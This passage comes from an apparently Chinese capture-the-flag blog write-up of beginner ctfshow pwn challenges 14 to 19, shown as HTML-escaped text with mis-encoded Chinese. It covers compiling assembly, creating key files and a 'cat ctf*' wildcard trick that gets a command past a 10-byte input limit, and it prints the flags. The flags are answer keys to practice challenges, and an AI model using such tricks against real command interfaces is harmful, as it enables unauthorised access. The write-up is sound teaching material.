&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;feof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// åœ¨ output æœ«å°¾å†™å…¥ &amp;#34;}&amp;#34;ï¼Œå®Œæˆæ ¼å¼åŒ…è£¹
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// æ‰“å°æœ€ç»ˆç”Ÿæˆçš„å­—ç¬¦ä¸²
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// å…³é—­æ–‡ä»¶
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåä¸ºkeyçš„æ–‡ä»¶ï¼Œè®©è¿™ä¸ªç¨‹åºçŸ¥é“ï¼Œç„¶åä»–å°±èƒ½æŠŠflagå­—ç¬¦ä¸²åå‡ºæ¥äº†ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;CTFshow&amp;#34;&lt;/span&gt;&amp;gt; key  &lt;span class=&#34;c1&#34;&gt;#åˆ›å»ºä¸€ä¸ªåä¸ºkeyå¾—æ–‡ä»¶ï¼Œå‘å†…è¾“å…¥â€œCTFshowâ€çš„å­—ç¬¦ä¸²&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/35.png&#34;
	width=&#34;1145&#34;
	height=&#34;336&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/35_hu_df60cb17ad88303e.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/35_hu_aca6ec48c69a455b.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;340&#34;
		data-flex-basis=&#34;817px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ç­”æ¡ˆæ˜¯ctfshow{01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010}&lt;/p&gt;
&lt;p&gt;é¢˜ç›®è¦æ±‚åœ¨keyé‡ŒåŠ CTFshowå­—ç¬¦ä¸²ï¼ŒåŠ å…¶å®ƒæ˜¯é”™çš„ï¼Œè¾“å‡ºç»“æœä¸åŒã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_015&#34;&gt;PWN_015
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šç¼–è¯‘æ±‡ç¼–ä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå³å¯æ‹¿åˆ°flagã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_015%5cflag.asm&#34; &gt;flag.asm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ±‡ç¼–è½¬æ¢ï¼šå°† .asm è½¬æ¢ä¸ºç›®æ ‡æ–‡ä»¶ï¼ˆ.obj æˆ– .oï¼‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nasm -f elf flag.asm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æ±‡ç¼–ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ld -m elf_i386 -s -o flag1 flag.o
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ï¼ˆflag1æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/36.png&#34;
	width=&#34;624&#34;
	height=&#34;165&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/36_hu_fda5333d80d87b82.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/36_hu_4d6103555c03c502.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;378&#34;
		data-flex-basis=&#34;907px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ¯”è¾ƒç®€å•ï¼Œå’Œ&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/#pwn_005&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN_005&lt;/a&gt;å¾ˆç±»ä¼¼ï¼Œéƒ½æ˜¯æ±‡ç¼–è¯­è¨€ç¼–è¯‘è¿è¡Œä¹‹ç±»çš„ã€‚&lt;/p&gt;
&lt;p&gt;ctfshow{@ss3mb1y_1s_3@sy}&lt;/p&gt;
&lt;h3 id=&#34;pwn_016&#34;&gt;PWN_016
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šä½¿ç”¨gccå°†å…¶ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_016%5cflag.s&#34; &gt;flag.s&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/37.png&#34;
	width=&#34;646&#34;
	height=&#34;104&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/37_hu_b3e8aef3e1ef05a0.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/37_hu_af79549354799dd4.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;621&#34;
		data-flex-basis=&#34;1490px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gcc flag.s -o flag
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å¯ä»¥ä½¿ç”¨ gcc å‘½ä»¤ç›´æ¥ç¼–è¯‘æ±‡ç¼–è¯­è¨€æºæ–‡ä»¶ï¼ˆ .s æ–‡ä»¶ï¼‰å¹¶å°†å…¶é“¾æ¥ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚ gcc å‘½ä»¤å…·æœ‰é€‚ç”¨äºå¤šç§è¯­è¨€çš„ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºåŠŸèƒ½ï¼Œå®ƒå¯ä»¥æ ¹æ®è¾“å…¥æ–‡ä»¶çš„æ‰©å±•åè‡ªåŠ¨é€‰æ‹©é€‚å½“çš„ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨ã€‚&lt;/p&gt;
&lt;p&gt;æ•…flagï¼šctfshow{daniuniuda}&lt;/p&gt;
&lt;h3 id=&#34;pwn_017&#34;&gt;PWN_017
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šæœ‰äº›å‘½ä»¤å¥½åƒæœ‰ç‚¹ä¸ä¸€æ ·ï¼Ÿä¸è¦ä¸€ç›´ç­‰ï¼Œå¯èƒ½é‚£æ ·æ°¸è¿œä¹Ÿç­‰ä¸åˆ°flagã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/38.png&#34;
	width=&#34;930&#34;
	height=&#34;325&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/38_hu_7d79a6ffed12bd13.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/38_hu_bffb150ab5d0f0e3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;è¿›ç¨‹3&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;286&#34;
		data-flex-basis=&#34;686px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ¯”è¾ƒå¥‡è‘©çš„æ˜¯ï¼Œè¿™é‡Œé€‰æ‹©3çš„è¯ï¼Œä¸€ç›´åœ¨loadingçš„ï¼Œå¯èƒ½æ˜¯ä¸é€šçš„ï¼Œæˆ‘æ¢åˆ°ä¸»æœºçš„ncä¹Ÿä¸è¡Œï¼Œé‚£å°±æ˜¯é€‰2è¿›ç¨‹çš„&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/39.png&#34;
	width=&#34;879&#34;
	height=&#34;536&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/39_hu_feeea272629e1334.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/39_hu_cc955cd53b60ba21.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;163&#34;
		data-flex-basis=&#34;393px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;é€‰äº†2åï¼Œç¨‹åºå¼€å§‹å‘ç™«äº†&amp;hellip;.ï¼Œä¸€ç›´å¾ªç¯æå¾—æˆ‘Kaliè™šæ‹Ÿæœºå¡æ­»äº†ï¼Œè¿›åˆ°IDAx64å»çœ‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/40.png&#34;
	width=&#34;1160&#34;
	height=&#34;423&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/40_hu_4ec1173fad870b57.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/40_hu_9873e66f0cb6080d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;274&#34;
		data-flex-basis=&#34;658px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªcase2çš„readå‡½æ•°åªè¯»å–10å­—èŠ‚ä»¥å†…çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ctfshow_flagï¼ˆ12byteï¼‰è¿™ä¸²æ˜¯è¶…å­—èŠ‚é™åˆ¶äº†ã€‚ä¸è¿‡ä¹‹å‰å­¦äº†é‚£ä¸ªæŒ‡ä»¤æœ‰é€šé…ç¬¦çš„cat ctf*ï¼ˆå› ä¸ºå½“ä½ é€‰æ‹©â€ls ./â€œï¼Œæ‰“å¼€å…¨éƒ¨æ–‡ä»¶åï¼Œå‘ç°åªæœ‰ä¸€ä¸ªctfshow_flagæ—¶ç”±ctfå­—çœ¼çš„ï¼Œé‚£æˆ‘ä»¬æ­£å¥½å¯ä»¥ç»•è¿‡è¶…å­—èŠ‚çš„é™åˆ¶äº†ï¼‰&lt;/p&gt;
&lt;p&gt;æœç´¢æ‰“å¼€ç”±ctfè¿™ä¸²å­—ç¬¦çš„æ–‡ä»¶å†…å®¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/41.png&#34;
	width=&#34;691&#34;
	height=&#34;231&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/41_hu_fc1a2ff65540e4c9.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/41_hu_6ea90f86dc5d2b36.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;299&#34;
		data-flex-basis=&#34;717px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_018&#34;&gt;PWN_018
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šä»”ç»†çœ‹çœ‹æºç ï¼Œæˆ–è®¸æœ‰æƒŠå–œï¼›å‡ä½œçœŸæ—¶çœŸäº¦å‡ï¼ŒçœŸä½œå‡æ—¶å‡äº¦çœŸã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_018&#34; &gt;PWN_018&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¿æ¥ncåä¸€ä¸Šæ¥å°±é—®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/42.png&#34;
	width=&#34;754&#34;
	height=&#34;275&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/42_hu_b8edf74f377f50dc.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/42_hu_48a1d4051a0ee6e8.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;274&#34;
		data-flex-basis=&#34;658px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™æˆ‘å“ªçŸ¥é“å•Šï¼Ÿå»çœ‹IDAx64ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/43.png&#34;
	width=&#34;736&#34;
	height=&#34;230&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/43_hu_a7c9b35aa1d7b9e4.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/43_hu_566fc56e89492c97.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;320&#34;
		data-flex-basis=&#34;768px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/44.png&#34;
	width=&#34;905&#34;
	height=&#34;370&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/44_hu_c4fb8fcadd3dd78e.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/44_hu_1ce437554407a80a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;244&#34;
		data-flex-basis=&#34;587px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åˆ†åˆ«è·Ÿè¿›ä¸€ä¸‹realå’Œfakeï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/46.png&#34;
	width=&#34;689&#34;
	height=&#34;156&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/46_hu_4f7764fbe823e672.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/46_hu_faedb59ceeafafd5.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;fake&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;441&#34;
		data-flex-basis=&#34;1060px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/47.png&#34;
	width=&#34;711&#34;
	height=&#34;189&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/47_hu_c473fd1e4140dc1a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/47_hu_f4c64f3e30a094f4.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;real&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;376&#34;
		data-flex-basis=&#34;902px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è§£è¯»ä¸€ä¸‹å‘ç°ä¸€ä¸ªæœºåˆ¶ï¼šå½“v4ä¸ç­‰äº9æ—¶å°±ä¼šæ‰§è¡Œrealå‡½æ•°ï¼Œè¿™æ—¶realä¼šæ‰§è¡Œ&lt;code&gt;echo &#39;flag is here&#39;&amp;gt;/ctfshow_flag&lt;/code&gt;ï¼Œè¿™ä¸ªå‘½ä»¤å°†å­—ç¬¦ä¸² &amp;lsquo;flag is here&amp;rsquo; è¦†ç›–å†™å…¥ /ctfshow_flag æ–‡ä»¶ä¸­ã€‚ &amp;gt; ç¬¦å·è¡¨ç¤ºä»¥è¦†ç›–çš„æ–¹å¼å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚å¦‚æœ /ctfshow_flag æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆè¯¥å‘½ä»¤ä¼šå°†æ–‡ä»¶ä¸­åŸæœ‰çš„å†…å®¹æ›¿æ¢ä¸º &amp;lsquo;flag is here&amp;rsquo; ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ ç¬¬ä¸€æ¬¡å’Œé¶æœºäº¤äº’æ—¶æ²¡è¾“å…¥9ï¼Œä½ ä»¥åéƒ½ä¸å¾—ä¸åˆ°flagäº†ï¼Œåªèƒ½é‡å¼€é¶æœº&amp;hellip;..æ¯”è¾ƒCSå§&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo &#39;flag is here&#39;&amp;gt;&amp;gt;/ctfshow_flag&lt;/code&gt;è¿™ä¸ªå‘½ä»¤å°†å­—ç¬¦ä¸² &amp;lsquo;flag is here&amp;rsquo; &lt;em&gt;&lt;strong&gt;è¿½åŠ &lt;/strong&gt;&lt;/em&gt;å†™å…¥ /ctfshow_flag æ–‡ä»¶ä¸­ã€‚ &amp;raquo; ç¬¦å·è¡¨ç¤ºä»¥è¿½åŠ çš„æ–¹å¼å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚å¦‚æœ /ctfshow_flag æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆè¯¥å‘½ä»¤ä¼šåœ¨æ–‡ä»¶çš„æœ«å°¾æ·»åŠ  &amp;lsquo;flag is here&amp;rsquo; ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸¤ä¸ªå‘½ä»¤éƒ½ç”¨äºå°† &amp;lsquo;flag is here&amp;rsquo; å†™å…¥ /ctfshow_flag æ–‡ä»¶ä¸­ï¼Œä¸åŒä¹‹å¤„åœ¨äºå†™å…¥æ–¹å¼çš„ä¸åŒã€‚ç¬¬ä¸€ä¸ªå‘½ä»¤ä½¿ç”¨è¿½åŠ æ–¹å¼ï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ å†…å®¹ï¼›ç¬¬äºŒä¸ªå‘½ä»¤ä½¿ç”¨è¦†ç›–æ–¹å¼ï¼Œå°†æ–‡ä»¶å†…å®¹æ›¿æ¢ä¸ºæ–°å†…å®¹ã€‚å…·ä½“ä½¿ç”¨å“ªä¸ªå‘½ä»¤å–å†³äºéœ€æ±‚å’Œæ–‡ä»¶æ“ä½œçš„é¢„æœŸç»“æœã€‚ä¹Ÿå°±æ˜¯æ‰€å‡çš„å…¶å®æ˜¯æˆ‘ä»¬éœ€è¦çš„çœŸçš„ï¼ŒçœŸçš„åè€Œæ˜¯å‡çš„åœ¨è¿œç¨‹ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç¬¬ä¸€æ¬¡è¯»åˆ°flagï¼Œå¦åˆ™åç»­å¾—åˆ°çš„flagéƒ½å·²ç»è¢«è¦†å†™å†è¿½åŠ ï¼ŒçœŸå®çš„flagå†…å®¹å·²ç»æ²¡äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/45.png&#34;
	width=&#34;751&#34;
	height=&#34;315&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/45_hu_5e1d20db51249b2d.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/45_hu_acaf9b3fd36a04e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;238&#34;
		data-flex-basis=&#34;572px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_019&#34;&gt;PWN_019
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå…³é—­äº†è¾“å‡ºæµï¼Œä¸€å®šæ˜¯æœ€å®‰å…¨çš„å—ï¼Ÿ &lt;a class=&#34;link&#34; href=&#34;PWN_019&#34; &gt;PWN_019&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/48.png&#34;
	width=&#34;1315&#34;
	height=&#34;636&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/48_hu_2e667aaa82bc0e4f.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/48_hu_d60e1adae16a1f50.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
